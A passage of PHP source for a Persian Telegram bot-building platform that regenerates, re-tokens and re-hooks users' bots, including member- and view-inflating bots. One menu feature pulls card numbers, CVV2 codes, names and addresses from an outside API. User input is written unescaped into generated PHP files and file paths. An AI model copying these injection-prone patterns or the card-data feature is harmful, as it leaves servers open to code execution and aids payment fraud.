[['text'=>"♻️ آپدیت خود ربات"],['text'=>"🤖 تعویض توکن ربات"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "Sokhan"){
$nameb = "سخنگو - سرگرمی گروه";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"]],
[['text'=>"🤖 تعویض توکن ربات"],['text'=>"📣 تعویض آیدی کانال"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "zedlink"){
$nameb = "ضدلینک - مدیریت گروه";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"]],
[['text'=>"🤖 تعویض توکن ربات"],['text'=>"📣 تعویض آیدی کانال"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "ViewGir"){
$nameb = "ویوگیر";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"],['text'=>"🤖 تعویض توکن ربات"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "SeTWebHoK"){
$nameb = "ست وبهوک";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"]],
[['text'=>"🤖 تعویض توکن ربات"],['text'=>"📣 تعویض آیدی کانال"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}

if($botc == "MemberGir"){
$nameb = "ممبرگیر";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"],['text'=>"🤖 تعویض توکن ربات"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
file_put_contents("dataPaMicK/$from_id/step.txt","updatesbot");
file_put_contents("dataPaMicK/$from_id/state.txt","$text");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖 - اطلاعات ربات شما دریافت شد 
👾 - نوع ربات شما $nameb است 
♻️ - کدوم بخش را میخواهید آپدیت کنید ؟

📚 - راهنما :
بخش آپدیت ایدی چنل برای تعویض چنل ثبت شدس
بخش آپدیت توکن ربات برای زمانی هست که توکن رباتتون رو عوض کردید و میخواهید جدید رو جایگزین کنید
بخش آپدیت زمان ارسال پروکسی برای تعویض تایم ارسالی است
بخش آپدیت خود ربات برای زمانیه آپدیتی رونمایی شده و فقط میخواهید اون رو فقط آپدیت کنید

⚠️توجه کنید هر کدوم از گزینه های بالا وجود نداشت یعنی این ربات نیازی ندارد یا از پنل تنظیم می شود.
",
'parse_mode'=>"html",  
'reply_markup'=>$menub,
]);
}

if($step == "updatesbot" && $text !="🔙 | بازگشت‌" ){
$botid = str_replace("♻️ @", null, $state);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
if($botc == "Payam"){
$nameb = "پیام رسان";
}
if($botc == "likeSaz"){
$nameb = "لایک ساز";
}
if($botc == "uplod"){
$nameb = "آپلودر";
}
if($botc == "proxy"){
$nameb = "پروکسی گذار";
}
if($botc == "chat"){
$nameb = "چت جی پی تی";
}
if($botc == "qure"){
$nameb = "قرعه کشی";
}
if($botc == "Sokhan"){
$nameb = "سخنگو - سرگرمی گروه";
}
if($botc == "zedlink"){
$nameb = "ضدلینک - مدیریت گروه";
}
if($botc == "ViewGir"){
$nameb = "ویوگیر";
}
if($botc == "SeTWebHoK"){
$nameb = "ست وبهوک";
}
if($botc == "MemberGir"){
$nameb = "ممبرگیر";
}
if($text == "♻️ آپدیت خود ربات"){
$botid = str_replace("♻️ @", null, $state);
$token = file_get_contents("dataPaMicK/bot/$botid/token.txt");
$channnel = file_get_contents("dataPaMicK/bot/$botid/channel.txt");
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");

if($botc == "Payam"){
$class = file_get_contents("source/Payam/indexpa.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[BOTIDD]",$botid,$class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
file_put_contents("PaMicKCreaT/$botid/indexpa.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/indexpa.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=> "ربات پیامرسان شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}
elseif($botc == "uplod"){
$class = file_get_contents("source/uplod/index.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
file_put_contents("PaMicKCreaT/$botid/index.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/index.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات آپلودر شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "proxy"){
$class = file_get_contents("source/Proxy/proxy.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[CHANNEEL]",$channnel,$class);
file_put_contents("PaMicKCreaT/$botid/proxy.php",$class);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات پروکسی گذار شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "chat"){
$class = file_get_contents("source/chat/indexch.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $botid, $class);
$class = str_replace("[CHANNEEL]",$channnel,$class);
file_put_contents("PaMicKCreaT/$botid/indexch.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/indexch.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات چت جی پی تی شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "LikeSaz"){
$class = file_get_contents("source/LikeSaz/index.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
file_put_contents("PaMicKCreaT/$botid/index.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/bot.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات لایک ساز شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "qure"){
$class = file_get_contents("source/qure/indexq.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[CHANNEEL]",$channnel,$class);
file_put_contents("PaMicKCreaT/$botid/indexq.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/indexq.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات قرعه کشی شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}
    
elseif($botc == "Sokhan"){
$class = file_get_contents("source/Sokhan/indexs.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[CHANNEEL]",$channnel,$class);
$class = str_replace("[BOOT]", $botid, $class);
file_put_contents("PaMicKCreaT/$botid/indexs.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/indexs.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات سرگرمی گروه شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}
    
elseif($botc == "zedlink"){
$class = file_get_contents("source/zedlink/index.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[CHANNEEL]",$channnel,$class);
$class = str_replace("[BOOT]", $botid, $class);
file_put_contents("PaMicKCreaT/$botid/index.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور پنل مدیریت وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/index.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات ضدلینک - مدیریت گروه شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "ViewGir"){
$class = file_get_contents("source/ViewGir/bot.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $botid, $class);
file_put_contents("PaMicKCreaT/$botid/bot.php",$class);
$classs = file_get_contents("source/ViewGir/lib/kodam/data-ads.json");
file_put_contents("PaMicKCreaT/$botid/lib/kodam/data-ads.json",$classs);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/bot.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات ویوگیر شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "SeTWebHoK"){
$class = file_get_contents("source/SeTWebHoK/index.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
file_put_contents("PaMicKCreaT/$botid/index.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/index.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات ست وبهوک شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}

elseif($botc == "MemberGir"){
$class = file_get_contents("source/MemberGir/bot.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $botid, $class);
file_put_contents("PaMicKCreaT/$botid/bot.php",$class);
$txt = urlencode("ربات شما با موفقیت آپدیت شد با دستور /panel وارد پنل مدیریتی ربات خود شوید ♻️");
file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/bot.php");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات ممبرگیر شما با موفقیت آپدیت شد و به سرور جدید متصل شد 👍",
'parse_mode'=>"html",  
'reply_markup'=>$menu,
]);
}}
elseif($text == "📣 تعویض آیدی کانال" and $botc != "qure" and $botc != "ViewGir" and $botc != "MemberGir" and $botc != "chat"){
$channnel = file_get_contents("dataPaMicK/bot/$botid/channel.txt");
file_put_contents("dataPaMicK/$from_id/step.txt","upscnl");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖 نوع ربات شما : $nameb
⚠️ ایدی چنل قبلی : $channnel
📣 لطفا ایدی جدید چنل خود را ارسال کنید
⚠️ - آیدی چنلتون رو بدون @ ارسال کنید
",
'parse_mode'=>"html",  
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
if($text == "🤖 تعویض توکن ربات"){
file_put_contents("dataPaMicK/$from_id/step.txt","uptkn");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖 نوع ربات شما : $nameb
♻️ توکن جدید خود را ارسال کنید
",
'parse_mode'=>"html",  
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text == "⏳ تعویض تایم ارسال" and $botc == "proxy"){
file_put_contents("dataPaMicK/$from_id/step.txt","uptme");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖 نوع ربات شما : $nameb
⏳ - تایم جدید را انتخاب کنید
",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"5 دقیقه یکبار"],['text'=>"1 دقیقه یکبار"]],
[['text'=>"30 دقیقه یکبار"],['text'=>"10 دقیقه یکبار"]],
[['text'=>"120 دقیقه یکبار"],['text'=>"60 دقیقه یکبار"]],
[['text'=>"300 دقیقه یکبار"],['text'=>"180 دقیقه یکبار"]],
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}}
//==================================================\\
if($step == "upscnl" && $text !="🔙 | بازگشت‌" ){
$botid = str_replace("♻️ @", null, $state);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
if($botc == "Payam"){
$nameb = "indexpa";
$namebs = "indexpa";
}
if($botc == "uplod"){
$nameb = "config";
$namebs = "index";
}
if($botc == "proxy"){
$nameb = "proxy";
$namebs = "proxy";
}
if($botc == "chat"){
$nameb = "indexch";
$namebs = "indexch";
}
if($botc == "qure"){
$nameb = "indexq";
$namebs = "indexq";
}
if($botc == "Sokhan"){
$nameb = "indexs";
$namebs = "indexs";
}
if($botc == "zedlink"){
$nameb = "index";
$namebs = "index";
}
if($botc == "ViewGir"){
$nameb = "config";
$namebs = "bot";
}
if($botc == "SeTWebHoK"){
$nameb = "index";
$namebs = "index";
}
if($botc == "MemberGir"){
$nameb = "config";
$namebs = "bot";
}
$botid = str_replace("♻️ @", null, $state);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
$channel = file_get_contents("dataPaMicK/bot/$botid/channel.txt");
$class = file_get_contents("PaMicKCreaT/$botid/$nameb.php");
$class = str_replace("$channel",$text,$class);
file_put_contents("PaMicKCreaT/$botid/$nameb.php",$class);
file_put_contents("dataPaMicK/bot/$botid/token.txt",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📣 - ایدی جدید شما با موفقیت ثبت شد",
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu,
]);
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/step.txt","none");
}
//==================================================\\
if($step == "uptkn" && $text !="🔙 | بازگشت‌" ){
$ckn = file_get_contents("https://api.pamickweb.ir/API/infotoken.php?type=getwebhookinfo&token=$text");
$data = json_decode($ckn);
$okckn = $data->ok;
if($okckn == "ok"){
$botid = str_replace("♻️ @", null, $state);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
if($botc == "Payam"){
$nameb = "indexpa";
$namebs = "indexpa";
}
if($botc == "uplod"){
$nameb = "config";
$namebs = "index";
}
if($botc == "proxy"){
$nameb = "proxy";
$namebs = "proxy";
}
if($botc == "chat"){
$nameb = "indexch";
$namebs = "indexch";
}
if($botc == "qure"){
$nameb = "indexq";
$namebs = "indexq";
}
if($botc == "Sokhan"){
$nameb = "indexs";
$namebs = "indexs";
}
if($botc == "zedlink"){
$nameb = "index";
$namebs = "index";
}
if($botc == "ViewGir"){
$nameb = "config";
$namebs = "bot";
}
if($botc == "SeTWebHoK"){
$nameb = "index";
$namebs = "index";
}
if($botc == "MemberGir"){
$nameb = "config";
$namebs = "bot";
}
$botid = str_replace("♻️ @", null, $state);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
$token = file_get_contents("dataPaMicK/bot/$botid/token.txt");
$class = file_get_contents("PaMicKCreaT/$botid/$nameb.php");
$class = str_replace("$token",$text,$class);
file_put_contents("PaMicKCreaT/$botid/$nameb.php",$class);
file_put_contents("dataPaMicK/bot/$botid/token.txt",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"♻️ - توکن جدید جایگزین شد",
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu,
]);
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$botid."/$namebs.php");

file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/step.txt","none");
}else{
file_put_contents("dataPaMicK/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"⚠️ - توکن بررسی شده اشتباه می باشد!",
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu,
]);
}}
//==================================================\\
if($step == "uptme" && $text !="🔙 | بازگشت‌" ){
if($text == "1 دقیقه یکبار" or $text == "5 دقیقه یکبار" or $text == "10 دقیقه یکبار" or $text == "30 دقیقه یکبار" or $text == "60 دقیقه یکبار" or $text == "120 دقیقه یکبار" or $text == "180 دقیقه یکبار" or $text == "300 دقیقه یکبار"){
if($text == "1 دقیقه یکبار"){
$time = 1;
}
if($text == "5 دقیقه یکبار"){
$time = 5;
}
if($text == "10 دقیقه یکبار"){
$time = 10;
}
if($text == "30 دقیقه یکبار"){
$time = 30;
}
if($text == "60 دقیقه یکبار"){
$time = 60;
}
if($text == "120 دقیقه یکبار"){
$time = 120;
}
if($text == "180 دقیقه یکبار"){
$time = 180;
}
if($text == "300 دقیقه یکبار"){
$time = 300;
}
$botid = str_replace("♻️ @", null, $state);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
file_put_contents("dataPaMicK/bot/$botid/channel.txt",$text);
$token = file_get_contents("dataPaMicK/bot/$botid/token.txt");
$class = file_get_contents("source/Proxy/proxy.php");
$class = str_replace("[TOKEEN]",$token,$class);
$class = str_replace("[CHANNEEL]",$text,$class);
file_put_contents("PaMicKCreaT/$botid/proxy.php",$class);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"⏳ - تایم جدید تنظیم شد",
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu,
]);
file_get_contents("https://api.pamickweb.ir/API/cron-job.php?url=https://pamickweb.ir/PaMicK/PaMicKCreaT/$botid/proxy.php&time=$time");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/step.txt","none");
}}
//==================================================\\
elseif($text1 == "👨🏼‍💼 حساب کاربری"){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
به بخش 🖥 | حساب کاربری خوش آمدید 🌹
",
'parse_mode'=>"MarkDown",  
'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"✏️ | حساب کاربری"],['text'=>"🛍 | خرید امتیاز"]],
[['text'=>"🎊 | امتیاز روزانه"]],
[['text'=>"🕊️ | انتقال امتیاز"],['text'=>"👤 | زیرمجموعه گیری"]],
[['text'=>"🔙 | بازگشت‌"]], 
],
'resize_keyboard'=>true,
])
]);
}
//==================================================\\
elseif($text1 == "🎀 بخش سرگرمی"){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
به بخش ⭐ | امکانات ربات خوش آمدید 🌹
",
'parse_mode'=>"MarkDown",  
'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"📎 | پسورد ساز"]],
[['text'=>"📺 | تلویزیون آنلاین"],['text'=>"🌝 | فال حافظ"]],
[['text'=>"🚀 | تست سرعت"]],
[['text'=>"🕌 | حدیث امامان"],['text'=>"📿 | ذکر امروز"]],
[['text'=>"🌐 | پروکسی ویژه"],['text'=>"🔧 | تنظیمات تلگرام"]],
[['text'=>"🐍 | دانستنی"]],
[['text'=>"🚘 | قیمت ماشین"],['text'=>"📋 | اطلاعات مستر کارت"]],
[['text'=>"🔙 | بازگشت‌"]], 
],
'resize_keyboard'=>true,
])
]);
}

if($text == "🐍 | دانستنی"){
$Danestani = file_get_contents("http://api.codebazan.ir/danestani/");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$Danestani

"]); }

elseif($text == "🚘 | قیمت ماشین"){
	$car = json_decode(file_get_contents("https://api.codebazan.ir/car-price/"),true);
    $name1 = $car["Result"]['0']["name"];
    $moshakhasat1 = $car["Result"]['0']["moshakhasat"];
   $karkhane1 = $car["Result"]['0']["karkhane"];
   $bazar1 = $car["Result"]['0']["bazar"];
   $name2 = $car["Result"]['1']["name"];
    $moshakhasat2 = $car["Result"]['1']["moshakhasat"];
   $karkhane2 = $car["Result"]['1']["karkhane"];
   $bazar2 = $car["Result"]['1']["bazar"];
   $name3 = $car["Result"]['10']["name"];
    $moshakhasat3 = $car["Result"]['10']["moshakhasat"];
   $karkhane3 = $car["Result"]['10']["karkhane"];
   $bazar3 = $car["Result"]['10']["bazar"];
   $name4 = $car["Result"]['12']["name"];
    $moshakhasat4 = $car["Result"]['12']["moshakhasat"];
   $karkhane4 = $car["Result"]['12']["karkhane"];
   $bazar4 = $car["Result"]['12']["bazar"];
   $name5 = $car["Result"]['15']["name"];
    $moshakhasat5 = $car["Result"]['15']["moshakhasat"];
   $karkhane5 = $car["Result"]['15']["karkhane"];
   $bazar5 = $car["Result"]['15']["bazar"];
   $name6 = $car["Result"]['26']["name"];
    $moshakhasat6 = $car["Result"]['26']["moshakhasat"];
   $karkhane6 = $car["Result"]['26']["karkhane"];
   $bazar6 = $car["Result"]['26']["bazar"];
   $name7 = $car["Result"]['35']["name"];
    $moshakhasat7 = $car["Result"]['35']["moshakhasat"];
   $karkhane7 = $car["Result"]['35']["karkhane"];
   $bazar7 = $car["Result"]['35']["bazar"];
    bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"قیمت ماشین ها 👇
🚘 نام ماشین : $name1
🍫 مشخصات : $moshakhasat1
💎 قیمت کارخانه :$karkhane1
💸 قیمت در بازار :$bazar1
➖➖➖➖➖➖➖➖➖
🚘 نام ماشین : $name2
🍫 مشخصات : $moshakhasat2
💎 قیمت کارخانه :$karkhane2
💸 قیمت در بازار :$bazar2
➖➖➖➖➖➖➖➖➖
🚘 نام ماشین : $name3
🍫 مشخصات : $moshakhasat3
💎 قیمت کارخانه :$karkhane3
💸 قیمت در بازار :$bazar3
➖➖➖➖➖➖➖➖➖
🚘 نام ماشین : $name4
🍫 مشخصات : $moshakhasat4
💎 قیمت کارخانه :$karkhane4
💸 قیمت در بازار :$bazar4
➖➖➖➖➖➖➖➖➖
🚘 نام ماشین : $name5
🍫 مشخصات : $moshakhasat5
💎 قیمت کارخانه :$karkhane5 
💸 قیمت در بازار :$bazar5 
➖➖➖➖➖➖➖➖➖
🚘 نام ماشین : $name6
🍫 مشخصات : $moshakhasat6
💎 قیمت کارخانه :$karkhane6
💸 قیمت در بازار :$bazar6
➖➖➖➖➖➖➖➖➖
🚘 نام ماشین : $name7
🍫 مشخصات : $moshakhasat7
💎 قیمت کارخانه :$karkhane7
💸 قیمت در بازار :$bazar7
➖➖➖➖➖➖➖➖➖

",
'parse_mode'=>'HTML',
]);
}

elseif($text == "📋 | اطلاعات مستر کارت"){
$VisaKart = file_get_contents("https://api.codebazan.ir/visa-card/");
 $Visa = json_decode($VisaKart,true);
  $name = $Visa["Result"]["0"]["name"];
  $lastname = $Visa["Result"]["0"]["lastname"];
  $Address = $Visa["Result"]["0"]["Address"];
  $City = $Visa["Result"]["0"]["City"];
  $State = $Visa["Result"]["0"]["State"];
  $Postalcode = $Visa["Result"]["0"]["Postalcode"];
  $Country = $Visa["Result"]["0"]["Country"];
  $birthday = $Visa["Result"]["0"]["birthday"];
  $cardtype = $Visa["Result"]["0"]["cardtype"];
  $cardnumber = $Visa["Result"]["0"]["cardnumber"];
 $CVV2 = $Visa["Result"]["0"]["CVV2"];
 $Expirationdate = $Visa["Result"]["0"]["Expirationdate"];
   $name1 = $Visa["Result"]["1"]["name"];
  $lastname1 = $Visa["Result"]["1"]["lastname"];
  $Address1 = $Visa["Result"]["1"]["Address"];
  $City1 = $Visa["Result"]["1"]["City"];
  $State1 = $Visa["Result"]["1"]["State"];
  $Postalcode1 = $Visa["Result"]["1"]["Postalcode"];
  $Country1 = $Visa["Result"]["1"]["Country"];
  $birthday1 = $Visa["Result"]["1"]["birthday"];
  $cardtype1 = $Visa["Result"]["1"]["cardtype"];
  $cardnumber1 = $Visa["Result"]["1"]["cardnumber"];
 $CVV21 = $Visa["Result"]["1"]["CVV2"];
 $Expirationdate1 = $Visa["Result"]["1"]["Expirationdate"];
$name2 = $Visa["Result"]["2"]["name"];
  $lastname2 = $Visa["Result"]["2"]["lastname"];
  $Address2 = $Visa["Result"]["2"]["Address"];
  $City2 = $Visa["Result"]["2"]["City"];
  $State2 = $Visa["Result"]["2"]["State"];
  $Postalcode2 = $Visa["Result"]["2"]["Postalcode"];
  $Country2 = $Visa["Result"]["2"]["Country"];
  $birthday2 = $Visa["Result"]["2"]["birthday"];
  $cardtype2 = $Visa["Result"]["2"]["cardtype"];
  $cardnumber2 = $Visa["Result"]["2"]["cardnumber"];
 $CVV22 = $Visa["Result"]["2"]["CVV2"];
 $Expirationdate2 = $Visa["Result"]["2"]["Expirationdate"];
 $name3 = $Visa["Result"]["3"]["name"];
  $lastname3 = $Visa["Result"]["3"]["lastname"];
  $Address3 = $Visa["Result"]["3"]["Address"];
  $City3 = $Visa["Result"]["3"]["City"];
  $State3 = $Visa["Result"]["3"]["State"];
  $Postalcode3 = $Visa["Result"]["3"]["Postalcode"];
  $Country3 = $Visa["Result"]["3"]["Country"];
  $birthday3 = $Visa["Result"]["3"]["birthday"];
  $cardtype3 = $Visa["Result"]["3"]["cardtype"];
  $cardnumber3 = $Visa["Result"]["3"]["cardnumber"];
 $CVV23 = $Visa["Result"]["3"]["CVV2"];
 $Expirationdate3 = $Visa["Result"]["3"]["Expirationdate"];
  $name4 = $Visa["Result"]["4"]["name"];
  $lastname4 = $Visa["Result"]["4"]["lastname"];
  $Address4 = $Visa["Result"]["4"]["Address"];
  $City4 = $Visa["Result"]["4"]["City"];
  $State4 = $Visa["Result"]["4"]["State"];
  $Postalcode4 = $Visa["Result"]["4"]["Postalcode"];
  $Country4 = $Visa["Result"]["4"]["Country"];
  $birthday4 = $Visa["Result"]["4"]["birthday"];
  $cardtype4 = $Visa["Result"]["4"]["cardtype"];
  $cardnumber4 = $Visa["Result"]["4"]["cardnumber"];
 $CVV24 = $Visa["Result"]["4"]["CVV2"];
 $Expirationdate4 = $Visa["Result"]["4"]["Expirationdate"];
   $name5 = $Visa["Result"]["5"]["name"];
  $lastname5 = $Visa["Result"]["5"]["lastname"];
  $Address5 = $Visa["Result"]["5"]["Address"];
  $City5 = $Visa["Result"]["5"]["City"];
  $State5 = $Visa["Result"]["5"]["State"];
  $Postalcode5 = $Visa["Result"]["5"]["Postalcode"];
  $Country5 = $Visa["Result"]["5"]["Country"];
  $birthday5 = $Visa["Result"]["5"]["birthday"];
  $cardtype5 = $Visa["Result"]["5"]["cardtype"];
  $cardnumber5 = $Visa["Result"]["5"]["cardnumber"];
 $CVV25 = $Visa["Result"]["5"]["CVV2"];
 $Expirationdate5 = $Visa["Result"]["5"]["Expirationdate"];
$name6 = $Visa["Result"]["6"]["name"];
  $lastname6 = $Visa["Result"]["6"]["lastname"];
  $Address6 = $Visa["Result"]["6"]["Address"];
